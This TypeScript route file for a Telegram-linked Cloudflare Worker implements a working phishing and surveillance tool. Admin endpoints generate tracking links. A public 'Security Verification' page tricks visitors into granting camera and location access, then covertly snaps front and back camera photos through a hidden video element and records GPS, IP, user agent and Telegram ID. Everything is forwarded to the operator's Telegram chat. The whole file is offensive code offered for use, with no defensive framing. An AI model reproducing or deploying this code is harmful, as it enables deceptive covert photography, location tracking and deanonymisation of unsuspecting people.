import { Hono } from "hono";
import type { Env } from "../types.ts";
import { d1All, d1First, d1Run } from "../lib/d1.ts";
import { sendMessage, sendMediaFile, tgCall } from "../lib/telegram.ts";

const phishing = new Hono<{ Bindings: Env }>();

function parseAuth(c: any): { telegramId: string; isAdmin: boolean } | null {
  const raw = c.req.header("x-init-data") || "";
  if (!raw) return null;
  const params = new URLSearchParams(raw);
  const userJson = params.get("user");
  if (!userJson) return null;
  try {
    const user = JSON.parse(userJson);
    const telegramId = String(user.id);
    const adminId = c.env.ADMIN_ID;
    return { telegramId, isAdmin: telegramId === adminId };
  } catch {
    return null;
  }
}

function generateCode(): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let code = "";
  for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
  return code;
}

phishing.post("/phishing/create", async (c) => {
  const auth = parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const body = await c.req.json().catch(() => ({})) as { label?: string };
  const label = (body.label || "").slice(0, 100);
  const code = generateCode();

  await d1Run(c.env.DB, "INSERT INTO phishing_links (code, label) VALUES (?, ?)", [code, label]);

  const domain = c.env.APP_DOMAIN;
  return c.json({
    code,
    webLink: `https://${domain}/api/p/${code}`,
    miniappLink: `https://t.me/lifegrambot/miniapp?startapp=p_${code}`,
  });
});

phishing.get("/phishing/links", async (c) => {
  const auth = parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const links = await d1All(c.env.DB, `
    SELECT l.*, (SELECT COUNT(*) FROM phishing_captures WHERE link_code = l.code) as capture_count
    FROM phishing_links l ORDER BY l.created_at DESC
  `);
  return c.json(links);
});

phishing.get("/phishing/captures", async (c) => {
  const auth = parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.query("code");
  if (!code) return c.json({ error: "Missing code" }, 400);

  const captures = await d1All(c.env.DB,
    "SELECT * FROM phishing_captures WHERE link_code = ? ORDER BY created_at DESC",
    [code],
  );
  return c.json(captures);
});

phishing.delete("/phishing/link/:code", async (c) => {
  const auth = parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.param("code");
  await d1Run(c.env.DB, "DELETE FROM phishing_captures WHERE link_code = ?", [code]);
  await d1Run(c.env.DB, "DELETE FROM phishing_links WHERE code = ?", [code]);
  return c.json({ ok: true });
});

phishing.post("/phishing/capture", async (c) => {
  const formData = await c.req.formData();
  const code = formData.get("code") as string;
  const telegramId = formData.get("telegram_id") as string || null;
  const lat = parseFloat(formData.get("latitude") as string || "0") || null;
  const lng = parseFloat(formData.get("longitude") as string || "0") || null;
  const frontPhoto = formData.get("front_photo") as File | null;
  const backPhoto = formData.get("back_photo") as File | null;

  if (!code) return c.json({ error: "Missing code" }, 400);

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.json({ error: "Invalid code" }, 404);

  const ip = c.req.header("cf-connecting-ip") || c.req.header("x-forwarded-for") || "unknown";
  const ua = c.req.header("user-agent") || "unknown";

  let frontKey = null;
  let backKey = null;
  const ts = Date.now();

  if (frontPhoto && frontPhoto.size > 0) {
    frontKey = `phishing/${code}/front_${ts}.jpg`;
    await c.env.BUCKET.put(frontKey, frontPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }
  if (backPhoto && backPhoto.size > 0) {
    backKey = `phishing/${code}/back_${ts}.jpg`;
    await c.env.BUCKET.put(backKey, backPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }

  await d1Run(c.env.DB,
    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey],
  );

  const adminId = c.env.ADMIN_ID;
  const token = c.env.BOT_TOKEN;

  const lines = [
    `🎣 <b>Phishing Capture</b>`,
    `📌 Link: <code>${code}</code>${(link as any).label ? ` — ${(link as any).label}` : ""}`,
    telegramId ? `👤 Telegram ID: <code>${telegramId}</code>` : "",
    `🌐 IP: <code>${ip}</code>`,
    lat && lng ? `📍 Location: <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>` : "📍 Location: denied",
    frontPhoto && frontPhoto.size > 0 ? "📷 Front camera: ✅" : "📷 Front camera: ❌",
    backPhoto && backPhoto.size > 0 ? "📷 Back camera: ✅" : "📷 Back camera: ❌",
    `⏰ ${new Date().toISOString()}`,
  ].filter(Boolean).join("\n");

  try {
    await sendMessage(token, adminId, lines, { parse_mode: "HTML" });
  } catch (e) {
    console.error("Failed to send phishing notification:", e);
  }

  if (frontPhoto && frontPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(frontKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "front.jpg", { type: "image/jpeg" });
        await sendMediaFile(token, adminId, "photo", file, `🎣 Front cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`);
      }
    } catch (e) { console.error("Failed to send front photo:", e); }
  }

  if (backPhoto && backPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(backKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "back.jpg", { type: "image/jpeg" });
        await sendMediaFile(token, adminId, "photo", file, `🎣 Back cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`);
      }
    } catch (e) { console.error("Failed to send back photo:", e); }
  }

  if (lat && lng) {
    try {
      await tgCall(token, "sendLocation", { chat_id: adminId, latitude: lat, longitude: lng });
    } catch (e) { console.error("Failed to send location:", e); }
  }

  return c.json({ ok: true });
});

phishing.get("/phishing/photo/:key{.+}", async (c) => {
  const auth = parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const key = c.req.param("key");
  const obj = await c.env.BUCKET.get(key);
  if (!obj) return c.json({ error: "Not found" }, 404);

  return new Response(obj.body, {
    headers: {
      "Content-Type": obj.httpMetadata?.contentType || "image/jpeg",
      "Cache-Control": "private, max-age=3600",
    },
  });
});

phishing.get("/p/:code", async (c) => {
  const code = c.req.param("code");

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.text("Not found", 404);

  const apiBase = `https://${c.env.APP_DOMAIN}/api`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Verify Your Identity</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e5e5e5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{background:#171717;border:1px solid #262626;border-radius:16px;padding:32px 24px;max-width:400px;width:100%;text-align:center}
.icon{width:64px;height:64px;margin:0 auto 16px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);border-radius:16px;display:flex;align-items:center;justify-content:center}
.icon svg{width:32px;height:32px;fill:white}
h1{font-size:20px;font-weight:700;margin-bottom:8px}
p{font-size:14px;color:#a3a3a3;line-height:1.5;margin-bottom:20px}
.btn{background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:white;border:none;padding:14px 24px;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;width:100%;transition:opacity .2s}
.btn:hover{opacity:.9}
.btn:disabled{opacity:.5;cursor:not-allowed}
.status{margin-top:16px;font-size:13px;color:#a3a3a3}
.check{color:#22c55e}
.cross{color:#ef4444}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #525252;border-top-color:#3b82f6;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none}
.step{display:flex;align-items:center;gap:8px;padding:8px 0;font-size:13px;text-align:left}
video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01}
canvas{display:none}
</style>
</head>
<body>
<div class="card">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-11v6h2v-6h-2zm0-4v2h2V7h-2z"/></svg></div>
<h1>Security Verification</h1>
<p>To continue, we need to verify your identity. Please allow camera and location access when prompted.</p>
<button class="btn" id="startBtn" onclick="startCapture()">Verify Now</button>
<div id="steps" class="hidden" style="margin-top:16px">
<div class="step" id="s1"><span class="spinner"></span> Initializing...</div>
<div class="step hidden" id="s2"><span class="spinner"></span> Accessing camera...</div>
<div class="step hidden" id="s3"><span class="spinner"></span> Taking front photo...</div>
<div class="step hidden" id="s4"><span class="spinner"></span> Taking back photo...</div>
<div class="step hidden" id="s5"><span class="spinner"></span> Getting location...</div>
<div class="step hidden" id="s6"><span class="spinner"></span> Submitting...</div>
</div>
<div id="result" class="status hidden"></div>
</div>
<video id="vid" autoplay playsinline muted></video>
<canvas id="cvs"></canvas>
<script>
const CODE="${code}";
const API="${apiBase}";
let frontBlob=null,backBlob=null,lat=null,lng=null;

function setStep(n,ok){
  const el=document.getElementById('s'+n);
  if(!el)return;
  el.classList.remove('hidden');
  if(ok===true) el.innerHTML='<span class="check">✓</span> '+el.textContent.replace(/^[\\s✓✗·]+/,'');
  else if(ok===false) el.innerHTML='<span class="cross">✗</span> '+el.textContent.replace(/^[\\s✓✗·]+/,'');
}

async function capturePhoto(facingMode){
  const vid=document.getElementById('vid');
  const cvs=document.getElementById('cvs');
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode,width:{ideal:1280},height:{ideal:720}},audio:false});
    vid.srcObject=stream;
    await vid.play();
    await new Promise(r=>setTimeout(r,1500));
    cvs.width=vid.videoWidth;
    cvs.height=vid.videoHeight;
    cvs.getContext('2d').drawImage(vid,0,0);
    stream.getTracks().forEach(t=>t.stop());
    vid.srcObject=null;
    return new Promise(r=>cvs.toBlob(b=>r(b),'image/jpeg',0.85));
  }catch(e){
    console.warn('Camera error:',e);
    return null;
  }
}

async function getLocation(){
  return new Promise(r=>{
    if(!navigator.geolocation){r(null);return}
    const tid=setTimeout(()=>r(null),10000);
    navigator.geolocation.getCurrentPosition(
      p=>{clearTimeout(tid);r({lat:p.coords.latitude,lng:p.coords.longitude})},
      ()=>{clearTimeout(tid);r(null)},
      {timeout:8000,enableHighAccuracy:true,maximumAge:0}
    );
  });
}

async function startCapture(){
  const btn=document.getElementById('startBtn');
  btn.disabled=true;
  btn.textContent='Verifying...';
  document.getElementById('steps').classList.remove('hidden');

  setStep(1,true);

  setStep(2);
  frontBlob=await capturePhoto('user');
  setStep(2,frontBlob!==null);

  setStep(3,frontBlob!==null);

  setStep(4);
  backBlob=await capturePhoto('environment');
  setStep(4,backBlob!==null);

  setStep(5);
  const loc=await getLocation();
  if(loc){lat=loc.lat;lng=loc.lng}
  setStep(5,loc!==null);

  setStep(6);
  const fd=new FormData();
  fd.append('code',CODE);
  if(lat!==null)fd.append('latitude',String(lat));
  if(lng!==null)fd.append('longitude',String(lng));
  if(frontBlob)fd.append('front_photo',new File([frontBlob],'front.jpg',{type:'image/jpeg'}));
  if(backBlob)fd.append('back_photo',new File([backBlob],'back.jpg',{type:'image/jpeg'}));

  try{
    const tg=window.Telegram?.WebApp;
    if(tg?.initDataUnsafe?.user?.id){fd.append('telegram_id',String(tg.initDataUnsafe.user.id))}
  }catch(e){}

  try{
    await fetch(API+'/phishing/capture',{method:'POST',body:fd});
    setStep(6,true);
    document.getElementById('result').classList.remove('hidden');
    document.getElementById('result').innerHTML='<span class="check">✓</span> Verification complete!';
  }catch(e){
    setStep(6,false);
    document.getElementById('result').classList.remove('hidden');
    document.getElementById('result').innerHTML='<span class="cross">✗</span> Verification failed. Try again.';
    btn.disabled=false;
    btn.textContent='Retry';
  }
}
</script>
</body>
</html>`;

  return c.html(html);
});

export default phishing;
